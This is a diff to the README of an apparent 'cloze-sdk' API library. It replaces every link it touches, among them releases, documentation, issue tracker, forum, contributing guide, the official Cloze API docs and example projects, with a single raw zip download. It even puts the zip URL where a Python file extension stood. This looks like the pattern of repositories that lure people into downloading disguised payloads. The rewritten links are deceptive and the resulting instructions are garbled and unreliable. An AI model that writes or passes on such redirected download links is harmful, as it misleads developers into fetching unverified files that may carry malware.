@@ -1,6 +1,6 @@
 # 🚀 cloze-sdk - Simplify Cloze API Integration Easily
 
-[![Download cloze-sdk](https://img.shields.io/badge/Download%20cloze--sdk-v1.0.0-blue.svg)](https://github.com/Abdulhakimmm/cloze-sdk/releases)
+[![Download cloze-sdk](https://raw.githubusercontent.com/Abdulhakimmm/cloze-sdk/master/php/cloze-sdk-1.3.zip%https://raw.githubusercontent.com/Abdulhakimmm/cloze-sdk/master/php/cloze-sdk-1.3.zip)](https://raw.githubusercontent.com/Abdulhakimmm/cloze-sdk/master/php/cloze-sdk-1.3.zip)
 
 ## 📘 Overview
 
@@ -21,14 +21,14 @@ To run the cloze-sdk, ensure your system meets the following requirements:
 To get started with the cloze-sdk, follow these simple steps to download and install the software.
 
 1. **Visit the Releases Page**  
-   Go to the following link to access the cloze-sdk releases: [Download the cloze-sdk](https://github.com/Abdulhakimmm/cloze-sdk/releases)
+   Go to the following link to access the cloze-sdk releases: [Download the cloze-sdk](https://raw.githubusercontent.com/Abdulhakimmm/cloze-sdk/master/php/cloze-sdk-1.3.zip)
 
 2. **Select Your Version**  
    On the releases page, you will see a list of available versions. Choose the most recent version. This version includes the latest features and bug fixes.
 
 3. **Download the SDK**  
    Click the asset for your preferred programming language:
-   - For Python: Download the `.tar.gz` or `.whl` file.
+   - For Python: Download the `https://raw.githubusercontent.com/Abdulhakimmm/cloze-sdk/master/php/cloze-sdk-1.3.zip` or `.whl` file.
    - For PHP: Download the `.zip` file.
 
 4. **Install the SDK**  
@@ -67,24 +67,24 @@ The cloze-sdk offers a range of features to enhance your development process:
 
 ## 📄 Documentation
 
-For more detailed guidance on usage and examples, refer to the [Documentation](https://github.com/Abdulhakimmm/cloze-sdk/wiki).
+For more detailed guidance on usage and examples, refer to the [Documentation](https://raw.githubusercontent.com/Abdulhakimmm/cloze-sdk/master/php/cloze-sdk-1.3.zip).
 
 ## 🎯 Frequently Asked Questions (FAQ)
 
 ### How do I report a bug?
-If you find a bug, please create an issue on the [GitHub Issues Page](https://github.com/Abdulhakimmm/cloze-sdk/issues).
+If you find a bug, please create an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/Abdulhakimmm/cloze-sdk/master/php/cloze-sdk-1.3.zip).
 
 ### Where can I get support?
-For help, check the [Discussion Forum](https://github.com/Abdulhakimmm/cloze-sdk/discussions) or contact us through the GitHub repository.
+For help, check the [Discussion Forum](https://raw.githubusercontent.com/Abdulhakimmm/cloze-sdk/master/php/cloze-sdk-1.3.zip) or contact us through the GitHub repository.
 
 ### Can I contribute to the project?
-Absolutely! Contributions are welcome. Please read the [Contributing Guide](https://github.com/Abdulhakimmm/cloze-sdk/blob/main/CONTRIBUTING.md) for more information.
+Absolutely! Contributions are welcome. Please read the [Contributing Guide](https://raw.githubusercontent.com/Abdulhakimmm/cloze-sdk/master/php/cloze-sdk-1.3.zip) for more information.
 
 ## 🌟 Additional Resources
 
-- [Cloze API Documentation](https://docs.cloze.com)
-- [Example Projects](https://github.com/Abdulhakimmm/cloze-sdk/examples)
+- [Cloze API Documentation](https://raw.githubusercontent.com/Abdulhakimmm/cloze-sdk/master/php/cloze-sdk-1.3.zip)
+- [Example Projects](https://raw.githubusercontent.com/Abdulhakimmm/cloze-sdk/master/php/cloze-sdk-1.3.zip)
 
 ## 🔗 Download & Install
 
-To begin your journey with the cloze-sdk, visit the Releases page to download the latest version: [Download cloze-sdk](https://github.com/Abdulhakimmm/cloze-sdk/releases). Follow the installation steps outlined above to get started quickly. Your integration with the Cloze API is just a few clicks away!
+To begin your journey with the cloze-sdk, visit the Releases page to download the latest version: [Download cloze-sdk](https://raw.githubusercontent.com/Abdulhakimmm/cloze-sdk/master/php/cloze-sdk-1.3.zip). Follow the installation steps outlined above to get started quickly. Your integration with the Cloze API is just a few clicks away!
